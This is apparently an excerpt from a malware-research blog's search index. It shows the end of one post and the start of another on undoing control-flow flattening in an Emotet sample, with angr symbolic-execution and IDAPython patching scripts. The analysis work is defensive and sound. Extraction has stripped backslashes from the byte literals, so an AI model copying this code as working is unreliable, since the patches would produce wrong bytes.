Exit:0x100097c5 -&gt; 0xd886856: None 0x8d4442d: jz 0xd886856 Entry:0x100099d2 Exit:0x100098db -&gt; 0x8d4442d Entry:0x100095a9 Exit:0x100096f2 -&gt; 0x3db060f: jz 0xe571e86: None 0x3db060f Entry:0x100097cd Exit:0x1000985b -&gt; 0x9005e79: jz 0xe571e86: None 0xe571e86 Entry:0x100098ac Exit:0x100098d8 -&gt; 0x9005e79 Entry:0x1000957b Exit:0x10009595 -&gt; 0xe571e86: jz 0xabd1e15: None 0xabd1e15 Entry:0x100098e8 Exit:0x100099ba -&gt; 0x94ee303: None 0xe571e86: jz 0x94ee303 Entry:0x10009863 Exit:0x1000988a -&gt; 0xe571e86: None . print(bb_state_map) print(&#39;==============&#39;) print(state_table) . {268470148: {&#39;is_obb&#39;: True, &#39;end&#39;: 268470548}, 268470548: {&#39;is_obb&#39;: True, &#39;end&#39;: 268470945}, 268470945: {&#39;is_obb&#39;: True, &#39;end&#39;: 268471345}, 268471345: {&#39;is_obb&#39;: True, &#39;end&#39;: 268471739}, 268471739: {&#39;is_obb&#39;: True, &#39;end&#39;: 268472135}, 268472135: {&#39;is_obb&#39;: True, &#39;end&#39;: 268472528}, 268472528: {&#39;is_obb&#39;: True, &#39;end&#39;: 268472925}, 268472925: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473318}, 268473318: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473658}, 268473658: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473673}, 268473673: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473685}, 268473685: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473691}, 268473691: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473699}, 268473699: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473711}, 268473711: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473715}, 268473715: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473723}, 268473723: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473749}, 268473749: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473769}, 268473769: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473794}, 268473794: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473827}, 268473827: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473877}, 268473877: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474018}, 268474018: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474070}, 268474070: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474098}, 268474098: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474101}, 268474101: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474106}, 268474106: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474131}, 268474131: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474162}, 268474162: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474192}, 268474192: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474238}, 268474238: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474287}, 268474287: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474309}, 268474309: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474317}, 268474317: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474342}, 268474342: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474416}, 268474416: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474459}, 268474459: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474467}, 268474467: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474506}, 268474506: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474516}, 268474516: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474528}, 268474528: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474532}, 268474532: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474540}, 268474540: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474584}, 268474584: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474587}, 268474587: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474600}, 268474600: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474628}, 268474628: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474764}, 268474764: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474776}, 268474776: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474783}, 268474783: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474788}, 268474788: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474810}, 268474810: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474817}, 268474817: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474822}, 268474822: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474834}, 268474834: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474839}} ============== {0: {&#39;entry&#39;: 268470148, &#39;exit&#39;: 268473318, &#39;next_states&#39;: [{&#39;state_value&#39;: 161707569, &#39;condition&#39;: None}]}, 161707569: {&#39;entry&#39;: 268474817, &#39;exit&#39;: 268474817, &#39;next_states&#39;: [{&#39;state_value&#39;: 66940794, &#39;condition&#39;: None}]}, 66940794: {&#39;entry&#39;: 268474131, &#39;exit&#39;: 268474309, &#39;next_states&#39;: [{&#39;state_value&#39;: 227043414, &#39;condition&#39;: None}, {&#39;state_value&#39;: 148128813, &#39;condition&#39;: &#39;jz&#39;}]}, 227043414: {&#39;entry&#39;: 268474834, &#39;exit&#39;: 268474587, &#39;next_states&#39;: []}, 148128813: {&#39;entry&#39;: 268473769, &#39;exit&#39;: 268474098, &#39;next_states&#39;: [{&#39;state_value&#39;: 64685583, &#39;condition&#39;: &#39;jz&#39;}, {&#39;state_value&#39;: 240590470, &#39;condition&#39;: None}]}, 64685583: {&#39;entry&#39;: 268474317, &#39;exit&#39;: 268474459, &#39;next_states&#39;: [{&#39;state_value&#39;: 151019129, &#39;condition&#39;: &#39;jz&#39;}, {&#39;state_value&#39;: 240590470, &#39;condition&#39;: None}]}, 240590470: {&#39;entry&#39;: 268474540, &#39;exit&#39;: 268474584, &#39;next_states&#39;: []}, 151019129: {&#39;entry&#39;: 268473723, &#39;exit&#39;: 268473749, &#39;next_states&#39;: [{&#39;state_value&#39;: 240590470, &#39;condition&#39;: &#39;jz&#39;}, {&#39;state_value&#39;: 180166165, &#39;condition&#39;: None}]}, 180166165: {&#39;entry&#39;: 268474600, &#39;exit&#39;: 268474810, &#39;next_states&#39;: [{&#39;state_value&#39;: 156164867, &#39;condition&#39;: None}, {&#39;state_value&#39;: 240590470, &#39;condition&#39;: &#39;jz&#39;}]}, 156164867: {&#39;entry&#39;: 268474467, &#39;exit&#39;: 268474506, &#39;next_states&#39;: [{&#39;state_value&#39;: 240590470, &#39;condition&#39;: None}]}} . Patching Ideas . Assumptions: . There is enough code cave space (dispatcher code) that we can implement our jump table | Any short jumps from an obb remain in the state (no patch needed) or jump to a code cave | ** Note we may need to first process states that have an exit_bb that doesn&#39;t have a jmp as the final instruction so we can check for code caves at the next address . ** We might want to proactivly patch out all cf blocks with nops to make the process easier to identify unused caves . For each state in the state map. . if there is only one next-state lookup next-state entry_bb if it immediate follows state exit_bb do nothing | if it does not immediatly follow check if state exit_bb has a jmp as the final instruction if it does then simply alter the address to point to the next-state entry_bb | if it doesn&#39;t then find the next available code cave - if it doesn&#39;t immediatly follow the bb we are f-ed!! | . | . | if there is more than one next-state again check for a jmp as the final state instruction or a code cave following the bb if there is enough space to add a conditional jmp and an unconditiona jmp add them in directly | if not then add ajmp to a larger code cave | . | . import idaapi import idautils import idc import struct # Function information BINARY_PATH = &#39;/tmp/emotet.bin&#39; fn_start = 0x10008784 fn_end = 0x100099D2 # Map of all the bb and their type (obb / cf) # bb_state_map[addr] = {&#39;is_obb&#39;: True, &#39;end&#39;: 268470548} bb_state_map = {268470148: {&#39;is_obb&#39;: True, &#39;end&#39;: 268470548}, 268470548: {&#39;is_obb&#39;: True, &#39;end&#39;: 268470945}, 268470945: {&#39;is_obb&#39;: True, &#39;end&#39;: 268471345}, 268471345: {&#39;is_obb&#39;: True, &#39;end&#39;: 268471739}, 268471739: {&#39;is_obb&#39;: True, &#39;end&#39;: 268472135}, 268472135: {&#39;is_obb&#39;: True, &#39;end&#39;: 268472528}, 268472528: {&#39;is_obb&#39;: True, &#39;end&#39;: 268472925}, 268472925: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473318}, 268473318: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473658}, 268473658: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473673}, 268473673: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473685}, 268473685: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473691}, 268473691: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473699}, 268473699: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473711}, 268473711: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473715}, 268473715: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473723}, 268473723: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473749}, 268473749: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473769}, 268473769: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473794}, 268473794: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473827}, 268473827: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473877}, 268473877: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474018}, 268474018: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474070}, 268474070: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474098}, 268474098: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474101}, 268474101: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474106}, 268474106: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474131}, 268474131: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474162}, 268474162: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474192}, 268474192: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474238}, 268474238: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474287}, 268474287: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474309}, 268474309: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474317}, 268474317: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474342}, 268474342: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474416}, 268474416: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474459}, 268474459: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474467}, 268474467: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474506}, 268474506: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474516}, 268474516: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474528}, 268474528: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474532}, 268474532: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474540}, 268474540: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474584}, 268474584: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474587}, 268474587: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474600}, 268474600: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474628}, 268474628: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474764}, 268474764: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474776}, 268474776: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474783}, 268474783: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474788}, 268474788: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474810}, 268474810: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474817}, 268474817: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474822}, 268474822: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474834}, 268474834: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474839}} # Map of the states their entry and exit and the next states # state_table[&#39;state_value&#39;] = { # &#39;entry&#39;: None # &#39;exit&#39;: None # &#39;next_states&#39;: [ {&#39;state_value&#39;:None, &#39;condition&#39;: None }, ] state_table = {0: {&#39;entry&#39;: 268470148, &#39;exit&#39;: 268473318, &#39;next_states&#39;: [{&#39;state_value&#39;: 161707569, &#39;condition&#39;: None}]}, 161707569: {&#39;entry&#39;: 268474817, &#39;exit&#39;: 268474817, &#39;next_states&#39;: [{&#39;state_value&#39;: 66940794, &#39;condition&#39;: None}]}, 66940794: {&#39;entry&#39;: 268474131, &#39;exit&#39;: 268474309, &#39;next_states&#39;: [{&#39;state_value&#39;: 227043414, &#39;condition&#39;: None}, {&#39;state_value&#39;: 148128813, &#39;condition&#39;: &#39;jz&#39;}]}, 227043414: {&#39;entry&#39;: 268474834, &#39;exit&#39;: 268474587, &#39;next_states&#39;: []}, 148128813: {&#39;entry&#39;: 268473769, &#39;exit&#39;: 268474098, &#39;next_states&#39;: [{&#39;state_value&#39;: 64685583, &#39;condition&#39;: &#39;jz&#39;}, {&#39;state_value&#39;: 240590470, &#39;condition&#39;: None}]}, 64685583: {&#39;entry&#39;: 268474317, &#39;exit&#39;: 268474459, &#39;next_states&#39;: [{&#39;state_value&#39;: 151019129, &#39;condition&#39;: &#39;jz&#39;}, {&#39;state_value&#39;: 240590470, &#39;condition&#39;: None}]}, 240590470: {&#39;entry&#39;: 268474540, &#39;exit&#39;: 268474584, &#39;next_states&#39;: []}, 151019129: {&#39;entry&#39;: 268473723, &#39;exit&#39;: 268473749, &#39;next_states&#39;: [{&#39;state_value&#39;: 240590470, &#39;condition&#39;: &#39;jz&#39;}, {&#39;state_value&#39;: 180166165, &#39;condition&#39;: None}]}, 180166165: {&#39;entry&#39;: 268474600, &#39;exit&#39;: 268474810, &#39;next_states&#39;: [{&#39;state_value&#39;: 156164867, &#39;condition&#39;: None}, {&#39;state_value&#39;: 240590470, &#39;condition&#39;: &#39;jz&#39;}]}, 156164867: {&#39;entry&#39;: 268474467, &#39;exit&#39;: 268474506, &#39;next_states&#39;: [{&#39;state_value&#39;: 240590470, &#39;condition&#39;: None}]}} # Track states that have been patched patched_states = [] # Nop all of the cf blocks - create our code caves for bb_addr in bb_state_map: if not bb_state_map[bb_addr][&#39;is_obb&#39;]: # Patch it idaapi.patch_bytes(bb_addr, b&#39; x90&#39;*(bb_state_map[bb_addr][&#39;end&#39;] - bb_addr)) # TODO: when we patch we should check to make sure there are enough nops to actually patch # Find all state exit bb that don&#39;t end with a patchable (jmp) instruction and add control flow in the following code cave # - if there is no following code cave !!! ERROR we can&#39;t proceed this is not patchable in-place for state_value in state_table: if len(state_table[state_value][&#39;next_states&#39;]) == 0: # This is an end state skip it continue #print(f&quot;STATE: {hex(state_value)}&quot;) exit_bb_start = state_table[state_value][&#39;exit&#39;] entry_bb_start = state_table[state_value][&#39;entry&#39;] #print(f&quot;entry_bb_start: {hex(entry_bb_start)}&quot;) #print(f&quot;exit_bb_start: {hex(exit_bb_start)}&quot;) # Check the final instruction of the exit bb exit_bb_end = bb_state_map[exit_bb_start][&#39;end&#39;] exit_bb_end_head = prev_head(exit_bb_end) exit_bb_final_mnemonic = print_insn_mnem(exit_bb_end_head) ## Assume you can&#39;t have conditional jumps from the state into the dispatcher if exit_bb_final_mnemonic != &#39;jmp&#39; and &#39;ret&#39; not in exit_bb_final_mnemonic : # Check if there is only one next state and it is contiguous next_states = state_table[state_value][&#39;next_states&#39;] if len(next_states) == 0: # This is an end block who cares print(f&quot;STATE: {hex(state_value)} Entry: {hex(entry_bb_start)} - No need to patch this it&#39;s an end block&quot;) patched_states.append(state_value) continue elif len(next_states) == 1: # Check if the state is contiguous next_state_value = next_states[0][&#39;state_value&#39;] next_state_entry = state_table[next_state_value][&#39;entry&#39;] if next_state_entry == exit_bb_end: print(f&quot;STATE: {hex(state_value)} Entry: {hex(entry_bb_start)} - No need to patch this it&#39;s contiguous&quot;) patched_states.append(state_value) continue # If we are here we need a code cave following our bb # Check is there space for a code cave if print_insn_mnem(exit_bb_end) == &#39;nop&#39;: print(f&quot;This bb needs to eat the code cave!!! - {hex(exit_bb_end_head)}&quot;) patched_states.append(state_value) # Directly add the jmps if len(next_states) == 1: # Directly patch one jmp patch_address = exit_bb_end next_state_value = next_states[0][&#39;state_value&#39;] next_state_entry = state_table[next_state_value][&#39;entry&#39;] jmp_rel = next_state_entry - (patch_address + 5) patch_jmp = b&#39; xe9&#39; + struct.pack(&#39;&lt;i&#39;,jmp_rel) idaapi.patch_bytes(patch_address, patch_jmp) else: # Find the condition and patch first then patch other jmp_condition = None conditional_address = None unconditional_address = None for next_state in next_states: if next_state[&#39;condition&#39;] is None: unconditional_address = state_table[next_state[&#39;state_value&#39;]][&#39;entry&#39;] else: conditional_address = state_table[next_state[&#39;state_value&#39;]][&#39;entry&#39;] jmp_condition = next_state[&#39;condition&#39;] # Set up the patch jumps # TODO: For now we will hard code the codition as a jz patch_jmp_cond_start = exit_bb_end jmp_rel_statisfied = conditional_address - (patch_jmp_cond_start + 6) patch_jmp_start = patch_jmp_cond_start + 6 jmp_rel = unconditional_address - (patch_jmp_start + 5) patch_jmp_condition = b&#39; x0f x84&#39; + struct.pack(&#39;&lt;i&#39;,jmp_rel_statisfied) patch_jmp = b&#39; xe9&#39; + struct.pack(&#39;&lt;i&#39;,jmp_rel) patch_bytes = patch_jmp_condition + patch_jmp idaapi.patch_bytes(exit_bb_end, patch_bytes) else: # NO? Abort! This won&#39;t work # If this is the case then it doesn&#39;t need to be patched # Else check for code cave print(f&quot;ABORT!! STATE: {hex(state_value)} Entry: {hex(entry_bb_start)}&quot;) abort_flag = False # Find all state exit bb that end with a short jmp - these need to be patched first they depend on the code cave proximity for state_value in state_table: if len(state_table[state_value][&#39;next_states&#39;]) == 0: # This is an end state skip it continue if abort_flag: break if state_value in patched_states: continue exit_bb_start = state_table[state_value][&#39;exit&#39;] entry_bb_start = state_table[state_value][&#39;entry&#39;] # Check the final instruction of the exit bb exit_bb_end = bb_state_map[exit_bb_start][&#39;end&#39;] exit_bb_end_head = prev_head(exit_bb_end) exit_bb_final_mnemonic = print_insn_mnem(exit_bb_end_head) ## Assume you can&#39;t have conditional jumps from the state into the dispatcher if exit_bb_final_mnemonic == &#39;jmp&#39;: # Check the number of bytes next_instruction_ea = next_head(exit_bb_end_head) instruction_count = next_instruction_ea - exit_bb_end_head if instruction_count &lt; 5: # This is a short jump # Follow the jump this will be our patch area short_jmp_address = get_operand_value(exit_bb_end_head,0) # Check if this a single jump to another state so we don&#39;t need to patch next_states = state_table[state_value][&#39;next_states&#39;] if len(next_states) == 1: # Check if the state is at the jump address next_state_address = state_table[next_states[0][&#39;state_value&#39;]][&#39;entry&#39;] if next_state_address == short_jmp_address: print(f&quot;STATE: {hex(state_value)} Entry: {hex(entry_bb_start)} - Short jump to next state no patch&quot;) patched_states.append(state_value) continue # If we got here we need to add a patch # Check if this address is available as a code cave if not adjust it patched_states.append(state_value) ptr_short_jmp_address = short_jmp_address while print_insn_mnem(ptr_short_jmp_address) != &#39;nop&#39;: # We need to adjust the jmp to the nearest code cave # Loop until we hit the next section of nops ptr_short_jmp_address = next_head(ptr_short_jmp_address) # Error if we run out of space in the function if ptr_short_jmp_address &gt;= fn_end: print(f&quot;ABORT - STATE: {hex(state_value)} Entry: {hex(entry_bb_start)} - short jmp nop finder hit end of function with no suitable code cave found!&quot;) abort_flag = True break # Check to see if we need to update the jmp diplacement if ptr_short_jmp_address != short_jmp_address: original_displacement = struct.unpack(&#39;b&#39;,get_bytes(exit_bb_end_head + 1, 1))[0] original_displacement += ptr_short_jmp_address - short_jmp_address try: idaapi.patch_bytes(exit_bb_end_head + 1, struct.pack(&#39;b&#39;,original_displacement)) print(f&quot;STATE: {hex(state_value)} Entry: {hex(entry_bb_start)} - Short jump updated jump to code cave: {hex(ptr_short_jmp_address)}&quot;) except: print(f&quot;ABORT - STATE: {hex(state_value)} Entry: {hex(entry_bb_start)} - short jmp code cave adjustment is too far!&quot;) abort_flag = True break # If we get here we can assume we are ready to patch at the ptr_short_jmp_address if len(next_states) == 1: # Directly patch one jmp patch_address = ptr_short_jmp_address next_state_value = next_states[0][&#39;state_value&#39;] next_state_entry = state_table[next_state_value][&#39;entry&#39;] jmp_rel = next_state_entry - (patch_address + 5) patch_jmp = b&#39; xe9&#39; + struct.pack(&#39;&lt;i&#39;,jmp_rel) idaapi.patch_bytes(patch_address, patch_jmp) print(f&quot;STATE: {hex(state_value)} Entry: {hex(entry_bb_start)} - Short jump patched with one state at {hex(patch_address)}&quot;) else: # Find the condition and patch first then patch other jmp_condition = None conditional_address = None unconditional_address = None for next_state in next_states: if next_state[&#39;condition&#39;] is None: unconditional_address = state_table[next_state[&#39;state_value&#39;]][&#39;entry&#39;] else: conditional_address = state_table[next_state[&#39;state_value&#39;]][&#39;entry&#39;] jmp_condition = next_state[&#39;condition&#39;] # Set up the patch jumps # TODO: For now we will hard code the codition as a jz patch_jmp_cond_start = ptr_short_jmp_address jmp_rel_statisfied = conditional_address - (patch_jmp_cond_start + 6) patch_jmp_start = patch_jmp_cond_start + 6 jmp_rel = unconditional_address - (patch_jmp_start + 5) patch_jmp_condition = b&#39; x0f x84&#39; + struct.pack(&#39;&lt;i&#39;,jmp_rel_statisfied) patch_jmp = b&#39; xe9&#39; + struct.pack(&#39;&lt;i&#39;,jmp_rel) patch_bytes = patch_jmp_condition + patch_jmp idaapi.patch_bytes(ptr_short_jmp_address, patch_bytes) print(f&quot;STATE: {hex(state_value)} Entry: {hex(entry_bb_start)} - Short jump patched with one two states at {hex(ptr_short_jmp_address)}&quot;) # Patch all remaining state exits for state_value in state_table: if len(state_table[state_value][&#39;next_states&#39;]) == 0: # This is an end state skip it continue if abort_flag: break if state_value in patched_states: continue exit_bb_start = state_table[state_value][&#39;exit&#39;] entry_bb_start = state_table[state_value][&#39;entry&#39;] # Get address of final instruction exit_bb_end = bb_state_map[exit_bb_start][&#39;end&#39;] exit_bb_end_head = prev_head(exit_bb_end) next_states = state_table[state_value][&#39;next_states&#39;] if len(next_states) == 1: # Directly patch one jmp patch_address = exit_bb_end_head next_state_value = next_states[0][&#39;state_value&#39;] next_state_entry = state_table[next_state_value][&#39;entry&#39;] jmp_rel = next_state_entry - (patch_address + 5) patch_jmp = b&#39; xe9&#39; + struct.pack(&#39;&lt;i&#39;,jmp_rel) idaapi.patch_bytes(patch_address, patch_jmp) print(f&quot;STATE: {hex(state_value)} Entry: {hex(entry_bb_start)} - patched with one state at {hex(patch_address)}&quot;) else: # Find the condition and patch first then patch other jmp_condition = None conditional_address = None unconditional_address = None for next_state in next_states: if next_state[&#39;condition&#39;] is None: unconditional_address = state_table[next_state[&#39;state_value&#39;]][&#39;entry&#39;] else: conditional_address = state_table[next_state[&#39;state_value&#39;]][&#39;entry&#39;] jmp_condition = next_state[&#39;condition&#39;] if unconditional_address is None or conditional_address is None: print(f&quot;conditions error!! {next_states}&quot;) abort_flag = True # Set up the patch jumps # TODO: For now we will hard code the codition as a jz # Find a code cave to insert our jumps - search from the fn start to end code_cave_ptr = fn_start while code_cave_ptr &lt;= fn_end: # Find a code cave with enough nops if print_insn_mnem(code_cave_ptr) == &#39;nop&#39;: if get_bytes(code_cave_ptr, 11) == b&#39; x90&#39;*11: break # Find next head code_cave_ptr = next_head(code_cave_ptr) # Check to make sure we didn&#39;t run out of room in the function if code_cave_ptr &gt;= fn_end: print(f&quot;ABORT - STATE: {hex(state_value)} Entry: {hex(entry_bb_start)} - no code cave found!&quot;) abort_flag = True break # Patch the jump to point to our new code cave patch_address = exit_bb_end_head new_jmp_address = code_cave_ptr jmp_rel = new_jmp_address - (patch_address + 5) patch_jmp = b&#39; xe9&#39; + struct.pack(&#39;&lt;i&#39;,jmp_rel) idaapi.patch_bytes(patch_address, patch_jmp) print(f&quot;STATE: {hex(state_value)} Entry: {hex(entry_bb_start)} - moved our jump to point to a code cave: {hex(code_cave_ptr)}&quot;) patch_jmp_cond_start = code_cave_ptr jmp_rel_statisfied = conditional_address - (patch_jmp_cond_start + 6) patch_jmp_start = patch_jmp_cond_start + 6 jmp_rel = unconditional_address - (patch_jmp_start + 5) patch_jmp_condition = b&#39; x0f x84&#39; + struct.pack(&#39;&lt;i&#39;,jmp_rel_statisfied) patch_jmp = b&#39; xe9&#39; + struct.pack(&#39;&lt;i&#39;,jmp_rel) patch_bytes = patch_jmp_condition + patch_jmp idaapi.patch_bytes(code_cave_ptr, patch_bytes) print(f&quot;STATE: {hex(state_value)} Entry: {hex(entry_bb_start)} - patched multiple states at code cave: {hex(code_cave_ptr)}&quot;) . Failures and Next Steps . We made a bad assumption when we derived conditional next states. Our assumption was that we could rely on the FLAGS that were used to set the state to still be intact by the time the state exited so all we would need to do is add a conditional jmp based on the FLAGS. This turned out to not be the case for all states so our conditional jumps were incorrectly influenced by other code in the state. . Hack #1 . One hack that we tried was to iterate through all insructions in the state and whenever the STATE register was invovled we replaced the instruction with an instruction to save the FLAGS in the STATE register. The assumption was that the last move into the STATE register would be the conditional one since it would overwrite the unconditional STATE. . 9c -&gt; push flags 5b -&gt; pop ebx (store FLAGS in state register) . Then before we added our conditional jump we moved the flags back into the FLAGS register. The idea was that now our conditional jump would be based on the same FLAGS that were used to set the STATE earlier in the state basedic blocks. . 53 -&gt; push ebx (state register withe stored FLAGS) 9d -&gt; pop flags . This does work except IDA is unable to simplify this logic so the end result is some random looking conditions that the analyst must investigate manually to recover the control flow. Not good! . .",
            "url": "https://research.openanalysis.net/angr/symbolic%20execution/deobfuscation/research/emotet/2022/04/20/emotet_deobfuscation_generic.html",
            "relUrl": "/angr/symbolic%20execution/deobfuscation/research/emotet/2022/04/20/emotet_deobfuscation_generic.html",
            "date": " ‚Ä¢ Apr 20, 2022"
        }
        
    
  
    
        ,"post54": {
            "title": "Symbolic Execution For Deobfuscation The Basics",
            "content": "Overview . DFS and BFS graph traversal tutorial | OST2 - Reverse Engineering 3201: Symbolic Analysis | Deobfuscation: recovering an OLLVM-protected program (QuarksLab) | Automated Detection of Control-flow Flattening (Tim Blazytko) | Hex-Rays Microcode API vs. Obfuscating Compiler | What is SSA Static Single Assigment | Assembly Instructions Data Sheet | IDA IR Explorer (Lucid) | Dissecting LLVM Obfuscator Part 1 | Stack-based graph traversal ‚â† depth first search | . Control Flow Flattening Obfuscation . Non-Obfuscated Control Flow . Obfuscated Control Flow (Flattened) . Symbolic Execution . A few concepts we need to understand first. . Static single assignment form | Symbolic execution | Z3 Theorem Prover | . Symbolic Execution With SSA IR . Labelling The Dispatcher . start at the entry of the fn and assume this is an obb and has a STATE (in some cases the STATE is passed as an argument so this is a bad assumption) | use symbolic execution to get the next bb if the next bb constraints depend on our STATE register this is a dispatcher (cf) bb, label this bb (entry to dispatcher) | if the next bb constaints are equal to a STATE register this next bb is an obb, label the next bb (exit from dispatcher) | if there is no branch (no constraints) keep the previous label, label this bb | . | if there are no next bb this is an END bb | . The example we will be using is an obfuscated Emotet binary eeb13cd51faa7c23d9a40241d03beb239626fbf3efe1dbbfa3994fc10dea0827 . import angr, claripy from queue import Queue import struct import logging logging.getLogger(&#39;angr&#39;).setLevel(&#39;ERROR&#39;) BINARY_PATH = &#39;/tmp/emotet.bin&#39; # Save some info about each bb # bb_states[bb_address] = {&quot;is_obb&quot;:true/false, &quot;end&quot;:&lt;end of bb&gt;} bb_states = {} bb_visited = set() fn_start = 0x10008784 fn_end = 0x100099D2 state_register = &#39;ebx&#39; project = angr.Project(BINARY_PATH, load_options={&#39;auto_load_libs&#39;: False}) # TODO: We should explicately add the state since we know it (main) initial_state = project.factory.call_state(addr=fn_start) # Use this setting to skip calls instead of a hook initial_state.options.add(angr.options.CALLLESS) # Setup simulation manager simgr = project.factory.simgr(initial_state) # We are going to start with an assumption that the first BB is in an obb # Since we are using a queue we need to track this rolling state along with the address of the bb # bb_info = {address:&lt;&gt;, prev_is_obb:true/false} # Use a queue for BFS q = Queue() # Push function start onto queue # Set the sim manager for the next state to remove any concrete value first_state = project.factory.blank_state(addr=fn_start) first_state.options.add(angr.options.CALLLESS) bb_info = {&#39;address&#39;:fn_start, &#39;prev_is_obb&#39;:True, &#39;state&#39;:first_state} q.put(bb_info) ## TODO: currently we don&#39;t handle when the first bb in a transition from a cf to obb doesn&#39;t set the STATE, # our algorithm will think this is just another cf bb # Walk the queue while not q.empty(): bb_info = q.get() bb_address = bb_info.get(&#39;address&#39;) prev_bb_is_obb = bb_info.get(&#39;prev_is_obb&#39;) new_state = bb_info.get(&#39;state&#39;) bb_end_address = new_state.block().size + new_state.block().addr print(f&quot;BB: {hex(bb_address)}&quot;) #print(project.factory.block(simgr.active[0].addr).pp()) print(f&quot;BB end:{hex(bb_end_address)}&quot;) ## Check if bb is already labeled in bb_states if it is just generate and push # the next states don&#39;t relabel it if bb_address not in bb_states: if prev_bb_is_obb: # Reset the state for any transition from an obb new_state = project.factory.blank_state(addr=bb_address) new_state.options.add(angr.options.CALLLESS) # Use successors to determine info about this block if len(list(project.factory.successors(new_state))) == 0: # If there are no successors this is an end bb so it must be an obb bb_states[bb_address] = {&#39;is_obb&#39;:True, &#39;end&#39;:bb_end_address} print(f&quot;This is an end block&quot;) elif len(list(project.factory.successors(new_state))) == 1: # If there is only next bb then there is no condition print(f&quot;Only one successor: {hex(project.factory.successors(new_state)[0].addr)}&quot;) if prev_bb_is_obb: # If we are in an obb keep the obb label bb_states[bb_address] = {&#39;is_obb&#39;:True, &#39;end&#39;:bb_end_address} print(f&quot;Previous bb was obb this one is too&quot;) else: bb_states[bb_address] = {&#39;is_obb&#39;:False, &#39;end&#39;:bb_end_address} print(f&quot;Previous bb was cf this one is too&quot;) else: # If there are multiple next bb then there is a condition # Determin if the branch depends on state print(f&quot;Multiple successors&quot;) print(f&quot; 